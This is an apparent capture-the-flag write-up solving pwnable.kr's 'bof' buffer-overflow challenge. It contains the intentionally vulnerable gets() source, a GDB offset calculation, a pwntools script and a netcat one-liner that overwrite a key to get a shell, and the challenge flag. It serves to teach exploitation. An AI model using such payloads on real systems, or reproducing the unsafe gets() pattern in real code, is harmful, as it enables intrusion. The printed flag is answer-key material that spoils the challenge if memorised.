# BOF
This is the 3rd challenge @ `pwnable.kr`  
Let's Start!

At this level we can download both the source code and a pre compiled binary:
```sh
wget http://pwnable.kr/bin/bof # get the binary
wget http://pwnable.kr/bin/bof.c # get the source
```

## Source Code + Binary Analysis
Let's take a look at the binary:
```bash
file ./bof
# bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```
**We can see that the binary is 32-bit elf.**
Let's take a look at the source code of the program:
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
The flow of the program:
- Calling func with pre-defined key (`0xdeadbeef`)
	- creating a buffer of 32 bytes
	- getting user input with `gets` function (vulnerable!)
	- checking if the key value is `0xcafebabe`
		- opening a shell

## About `gets` and `buffer-overflow`
Only by the name of the challenge and the comments in the source, we know this will be a `Buffer Overflow` challenge.
### Buffer Overflow ?
If you don't know what a buffer overflow is, I really recommend to look it up, as I might not explain it in the best way.
Chat-GPT says:
*A buffer overflow occurs when a program writes more data to a buffer (a fixed-size block of memory) than it can hold, causing the excess data to overwrite adjacent memory, which can lead to crashes, unexpected behavior, or exploitation by attackers to execute malicious code.*
Basically in low-level languages the programmer must allocate the right buffer size before allowing user input to get into the buffer.
For example:
While in `python` we can do this:
```python
s = input(">> ")
```
In `C` we must do something like this
```c
char buf[32];
printf(">> ");
gets(buf);
```
Congrats! the C code is vulnerable to a buffer overflow!
Let's take a look at the flow:
- creating a 32 bytes long buffer.
- printing `>> ` to the screen
- getting user input from `STDIN` into the buffer
But our buffer is only 32 bytes long... there is nothing checking that the user input is not longer - which means the user is able to write ANYTHING to the STACK. The user now can modify variables, change the execution flow of the program and more.
## Exploit!
So to win this challenge we need to make sure the `KEY` variable is being change from `0xdeadbeef` to `0xcafebabe`.
Because the call to the `gets` function - we can use buffer overflow to achieve this!
We need to calculate the offset from our input, to the key variable. Let's use `GDB`!
-  launch the debuger
- set break point on `gets`
- run the program
- go to the next line
- input a string
- check the stack
```sh
gdb ./bof
break gets
# Breakpoint 1 at 0x4c0
r
# overflow me :
n
AAAABBBBCCCC
# 0x56555654 in func ()
x/100x $ebp-44
# 0xffffd07c:	0x41414141	0x42424242	0x43434343	0x44444444
# 0xffffd08c:	0x45454545	0x46464646	0x47474747	0x48484848
# 0xffffd09c:	0x49494949	0xffffd000	0xf7fc1688	0xffffd0c8
# 0xffffd0ac:	0x5655569f	0xdeadbeef	0x00000000	0x00000000
# 0xffffd0bc:	0x00000000	0x00000000	0x00000070	0x00000000
# 0xffffd0cc:	0xf7da62d5	0x00000001	0xffffd184	0xffffd18c
# 0xffffd0dc:	0xffffd0f0	0xf7f9fff4	0x5655568a	0x00000001
# 0xffffd0ec:	0xffffd184	0xf7f9fff4	0x565556b0	0xf7ffcb80
# 0xffffd0fc:	0x00000000	0x69d1419a	0x22b5cb8a	0x00000000
# 0xffffd10c:	0x00000000	0x00000000	0xf7ffcb80	0x00000000
# 0xffffd11c:	0x60f9a400	0xf7ffda50	0xf7da6266	0xf7f9fff4
# 0xffffd12c:	0xf7da6398	0xf7fc9aec	0x56556ff4	0x00000001
# 0xffffd13c:	0x56555530	0x00000000	0xf7fdb7d0	0xf7da6319
# 0xffffd14c:	0x56556ff4	0x00000001	0x56555530	0x00000000
# 0xffffd15c:	0x56555561	0x5655568a	0x00000001	0xffffd184
# 0xffffd16c:	0x565556b0	0x56555720	0xf7fcd7d0	0xffffd17c
# 0xffffd17c:	0xf7ffda50	0x00000001	0xffffd335	0x00000000
# 0xffffd18c:	0xffffd362	0xffffd378	0xffffd3a7	0xffffd3ba
# 0xffffd19c:	0xffffd3cb	0xffffd3e2	0xffffd420	0xffffd454
# 0xffffd1ac:	0xffffd466	0xffffd479	0xffffd482	0xffffd491
# 0xffffd1bc:	0xffffd4c7	0xffffd4d2	0xffffd4e1	0xffffd50a
# 0xffffd1cc:	0xffffd526	0xffffd563	0xffffd576	0xffffd58d
# 0xffffd1dc:	0xffffd5a0	0xffffd5ad	0xffffd5c4	0xffffd5d0
# 0xffffd1ec:	0xffffd5e1	0xffffd66a	0xffffd689	0xffffd69d
# 0xffffd1fc:	0xffffd6ae	0xffffd6c3	0xffffd6d6	0xffffd6e3
```
You can see that our input is starting at `0x41414141` (`AAAA`) at the address `0xffffd07c`. We can see the word `deadbeef` at:
```
# 0xffffd0ac:	0x5655569f	0xdeadbeef
```
we can use python to get the address of `deadbeef` and to get the offset:
```python
starting_addr = 0xffffd07c
deadbeef_addr = 0xffffd0ac + 4
deadbeef_addr - starting_addr
# 52
```
Now we know we have 52 bytes between where our buffer starts to the target address.
We need to:
- fill the buffer with 52 bytes
- write `cafebabe` (Endianness)
Let's use python and `pwntools`! (`exploit.py`)
```python
import pwn
# building the payload
filler = b'\x01' * 52
target_key = b'\xbe\xba\xfe\xca'
payload = filler + target_key + b"\n"
# exploiting
conn = pwn.remote('pwnable.kr', 9000)
print("sending payload...")
conn.send(payload)
print("opening interactive shell")
conn.interactive()
```
Or if you like bash:
```sh
(python3 -c "import sys;sys.stdout.buffer.write(b'\x01'*52+b'\xbe\xba\xfe\xca'+b'\n')";cat) | nc pwnable.kr 9000
```
Now just:
```sh
cat flag
# daddy, I just pwned a buFFer :)
```
PWNED!